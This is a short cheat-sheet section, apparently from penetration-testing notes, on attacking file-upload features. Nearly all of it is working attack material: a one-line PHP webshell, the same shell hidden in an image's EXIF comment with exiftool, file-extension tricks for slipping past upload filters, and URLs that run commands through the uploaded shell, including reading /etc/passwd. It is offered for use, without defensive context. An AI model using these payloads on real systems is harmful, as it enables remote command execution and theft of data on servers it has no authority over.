## File Upload
```bash
-- Create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
-- Embed in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
-- Extension bypass
shell.php → shell.php.jpg → shell.phtml → shell.pHp
-- Execute commands
http://target/uploads/shell.php?cmd=whoami
http://target/uploads/shell.php?cmd=cat /etc/passwd
```
